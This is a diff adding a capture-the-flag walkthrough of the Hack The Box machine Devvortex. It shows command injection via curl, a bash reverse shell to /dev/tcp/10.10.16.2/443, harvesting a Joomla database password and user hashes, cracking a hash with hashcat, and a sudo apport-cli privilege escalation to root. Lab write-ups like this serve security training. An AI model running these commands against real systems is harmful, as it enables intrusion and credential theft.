@@ -1,3 +1,7 @@
+---
+icon: desktop
+---
+
 # Devvortex
 
 
@@ -308,49 +312,328 @@ Task Completed
 
 
 
+<figure><img src="../../.gitbook/assets/imagen (2).png" alt=""><figcaption></figcaption></figure>
+
+
+
+<figure><img src="../../.gitbook/assets/imagen (1).png" alt=""><figcaption></figcaption></figure>
+
+
+
+<figure><img src="../../.gitbook/assets/imagen (3).png" alt=""><figcaption></figcaption></figure>
+
+
+
+<figure><img src="../../.gitbook/assets/imagen (4).png" alt=""><figcaption></figcaption></figure>
+
+
+
+<figure><img src="../../.gitbook/assets/imagen (5).png" alt=""><figcaption></figcaption></figure>
+
+
+
+<figure><img src="../../.gitbook/assets/imagen (6).png" alt=""><figcaption></figcaption></figure>
+
+
+
+```bash
+❯ curl -s 'http://dev.devvortex.htb/gzzcoo' --data-urlencode 'gzzcoo=whoami'
+www-data
+```
 
 
 
 
 
+```bash
+❯ nc -nlvp 443
+listening on [any] 443 ...
+```
 
 
 
+```bash
+❯ curl -s 'http://dev.devvortex.htb/gzzcoo' --data-urlencode 'gzzcoo=/bin/bash -c "bash -i >& /dev/tcp/10.10.16.2/443 0>&1"'
+```
 
 
 
+```bash
+❯ nc -nlvp 443
+listening on [any] 443 ...
+connect to [10.10.16.2] from (UNKNOWN) [10.10.11.242] 35136
+bash: cannot set terminal process group (854): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@devvortex:~/dev.devvortex.htb$
+```
 
 
 
+```bash
+www-data@devvortex:~/dev.devvortex.htb$ cat /etc/passwd | grep bash
+root:x:0:0:root:/root:/bin/bash
+logan:x:1000:1000:,,,:/home/logan:/bin/bash
+```
 
 
 
+```bash
+www-data@devvortex:~/dev.devvortex.htb$ ls -l
+total 112
+-rwxr-xr-x  1 www-data www-data 18092 Dec 13  2022 LICENSE.txt
+-rwxr-xr-x  1 www-data www-data  4942 Dec 13  2022 README.txt
+drwxr-xr-x 11 www-data www-data  4096 Dec 13  2022 administrator
+drwxr-xr-x  5 www-data www-data  4096 Dec 13  2022 api
+drwxr-xr-x  2 www-data www-data  4096 Dec 13  2022 cache
+drwxr-xr-x  2 www-data www-data  4096 Dec 13  2022 cli
+drwxr-xr-x 18 www-data www-data  4096 Dec 13  2022 components
+-rw-r--r--  1 www-data www-data  2037 Sep 25  2023 configuration.php
+-rwxr-xr-x  1 www-data www-data  6858 Dec 13  2022 htaccess.txt
+drwxr-xr-x  5 www-data www-data  4096 Dec 13  2022 images
+drwxr-xr-x  2 www-data www-data  4096 Dec 13  2022 includes
+-r-xr-x---  1 www-data www-data  1068 Dec 13  2022 index.php
+drwxr-xr-x  4 www-data www-data  4096 Dec 13  2022 language
+drwxr-xr-x  6 www-data www-data  4096 Dec 13  2022 layouts
+drwxr-xr-x  6 www-data www-data  4096 Dec 13  2022 libraries
+drwxr-xr-x 71 www-data www-data  4096 Dec 13  2022 media
+drwxr-xr-x 26 www-data www-data  4096 Dec 13  2022 modules
+drwxr-xr-x 25 www-data www-data  4096 Dec 13  2022 plugins
+-rwxr-xr-x  1 www-data www-data   764 Dec 13  2022 robots.txt
+drwxr-xr-x  4 www-data www-data  4096 Dec 13  2022 templates
+drwxr-xr-x  2 www-data www-data  4096 Feb  5 23:04 tmp
+-rwxr-xr-x  1 www-data www-data  2974 Dec 13  2022 web.config.txt
+```
 
 
 
+```bash
+www-data@devvortex:~/dev.devvortex.htb$ cat configuration.php 
+<?php
+class JConfig {
+	public $offline = false;
+	public $offline_message = 'This site is down for maintenance.<br>Please check back again soon.';
+	public $display_offline_message = 1;
+	public $offline_image = '';
+	public $sitename = 'Development';
+	public $editor = 'tinymce';
+	public $captcha = '0';
+	public $list_limit = 20;
+	public $access = 1;
+	public $debug = false;
+	public $debug_lang = false;
+	public $debug_lang_const = true;
+	public $dbtype = 'mysqli';
+	public $host = 'localhost';
+	public $user = 'lewis';
+	public $password = 'P4ntherg0t1n5r3c0n##';// Some code
+```
 
 
 
+```bash
+www-data@devvortex:~/dev.devvortex.htb$ which mysql
+/usr/bin/mysql
+www-data@devvortex:~/dev.devvortex.htb$ mysql -u lewis -p
+Enter password: 
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 9425
+Server version: 8.0.35-0ubuntu0.20.04.1 (Ubuntu)
+
+Copyright (c) 2000, 2023, Oracle and/or its affiliates.
+
+Oracle is a registered trademark of Oracle Corporation and/or its
+affiliates. Other names may be trademarks of their respective
+owners.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+mysql> SHOW DATABASES;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| joomla             |
+| performance_schema |
++--------------------+
+3 rows in set (0.01 sec)
+
+mysql> USE joomla;
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+mysql> 
+```
 
 
 
+<pre class="language-bash"><code class="lang-bash">mysql> SHOW TABLES;
++-------------------------------+
+| Tables_in_joomla              |
++-------------------------------+
+| sd4fg_action_log_config       |
+| sd4fg_action_logs             |
+| sd4fg_action_logs_extensions  |
+| sd4fg_action_logs_users       |
+<strong>
+</strong><strong>...[snip]...
+</strong>
+| sd4fg_user_keys               |
+| sd4fg_user_mfa                |
+| sd4fg_user_notes              |
+| sd4fg_user_profiles           |
+| sd4fg_user_usergroup_map      |
+| sd4fg_usergroups              |
+| sd4fg_users                   |
+| sd4fg_viewlevels              |
+| sd4fg_webauthn_credentials    |
+| sd4fg_workflow_associations   |
+| sd4fg_workflow_stages         |
+| sd4fg_workflow_transitions    |
+| sd4fg_workflows               |
++-------------------------------+
+71 rows in set (0.00 sec)
+</code></pre>
 
 
 
+```bash
+mysql> SELECT * FROM sd4fg_users;
++-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+
+| id  | name       | username | email               | password                                                     | block | sendEmail | registerDate        | lastvisitDate       | activation | params                                                                                                                                                  | lastResetTime | resetCount | otpKey | otep | requireReset | authProvider |
++-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+
+| 649 | lewis      | lewis    | lewis@devvortex.htb | $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u |     0 |         1 | 2023-09-25 16:44:24 | 2025-02-05 23:01:42 | 0          |                                                                                                                                                         | NULL          |          0 |        |      |            0 |              |
+| 650 | logan paul | logan    | logan@devvortex.htb | $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12 |     0 |         0 | 2023-09-26 19:15:42 | NULL                |            | {"admin_style":"","admin_language":"","language":"","editor":"","timezone":"","a11y_mono":"0","a11y_contrast":"0","a11y_highlight":"0","a11y_font":"0"} | NULL          |          0 |        |      |            0 |              |
++-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+
+2 rows in set (0.00 sec)
+```
 
 
 
+```bash
+❯ hashid '$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12'
+Analyzing '$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12'
+[+] Blowfish(OpenBSD) 
+[+] Woltlab Burning Board 4.x 
+[+] bcrypt 
+
+❯ hashcat -a 0 -m 3200 hashes /usr/share/wordlists/rockyou.txt
+hashcat (v6.2.6) starting
+
+OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+============================================================================================================================================
+* Device #1: cpu-sandybridge-11th Gen Intel(R) Core(TM) i5-1135G7 @ 2.40GHz, 2913/5891 MB (1024 MB allocatable), 8MCU
+
+
+$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12:tequieromucho
+```
 
 
 
+```bash
+❯ ssh logan@devvortex.htb
+The authenticity of host 'devvortex.htb (10.10.11.242)' can't be established.
+ED25519 key fingerprint is SHA256:RoZ8jwEnGGByxNt04+A/cdluslAwhmiWqG3ebyZko+A.
+This host key is known by the following other names/addresses:
+    ~/.ssh/known_hosts:18: [hashed name]
+    ~/.ssh/known_hosts:29: [hashed name]
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'devvortex.htb' (ED25519) to the list of known hosts.
+logan@devvortex.htb's password: 
+Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-167-generic x86_64)
+
+
+Last login: Mon Feb 26 14:44:38 2024 from 10.10.14.23
+logan@devvortex:~$ cat user.txt 
+272c6688bdf7********************
+```
 
 
 
+```bash
+logan@devvortex:~$ sudo -l
+[sudo] password for logan: 
+Matching Defaults entries for logan on devvortex:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User logan may run the following commands on devvortex:
+    (ALL : ALL) /usr/bin/apport-cli
+```
 
 
 
+{% embed url="https://github.com/diego-tella/CVE-2023-1326-PoC" %}
+
+```bash
+logan@devvortex:~$ sudo /usr/bin/apport-cli --file-bug
+
+*** What kind of problem do you want to report?
 
 
+Choices:
+  1: Display (X.org)
+  2: External or internal storage devices (e. g. USB sticks)
+  3: Security related problems
+  4: Sound/audio related problems
+  5: dist-upgrade
+  6: installation
+  7: installer
+  8: release-upgrade
+  9: ubuntu-release-upgrader
+  10: Other problem
+  C: Cancel
+Please choose (1/2/3/4/5/6/7/8/9/10/C): 1
 
 
+*** Collecting problem information
 
+The collected information can be sent to the developers to improve the
+application. This might take a few minutes.
+
+*** What display problem do you observe?
+
+
+Choices:
+  1: I don't know
+  2: Freezes or hangs during boot or usage
+  3: Crashes or restarts back to login screen
+  4: Resolution is incorrect
+  5: Shows screen corruption
+  6: Performance is worse than expected
+  7: Fonts are the wrong size
+  8: Other display-related problem
+  C: Cancel
+Please choose (1/2/3/4/5/6/7/8/C): 2
+
+*** 
+
+To debug X freezes, please see https://wiki.ubuntu.com/X/Troubleshooting/Freeze
+
+Press any key to continue... !
+..dpkg-query: no packages found matching xorg
+..................
+
+*** Send problem report to the developers?
+
+After the problem report has been sent, please fill out the form in the
+automatically opened web browser.
+
+What would you like to do? Your options are:
+  S: Send report (1.4 KB)
+  V: View report
+  K: Keep report file for sending later or copying to somewhere else
+  I: Cancel and ignore future crashes of this program version
+  C: Cancel
+Please choose (S/V/K/I/C): V
+
+What would you like to do? Your options are:
+  S: Send report (1.4 KB)
+  V: View report
+  K: Keep report file for sending later or copying to somewhere else
+  I: Cancel and ignore future crashes of this program version
+  C: Cancel
+Please choose (S/V/K/I/C): v
+!bash
+root@devvortex:/home/logan# cat /root/root.txt 
+4dd686c1************************
+```
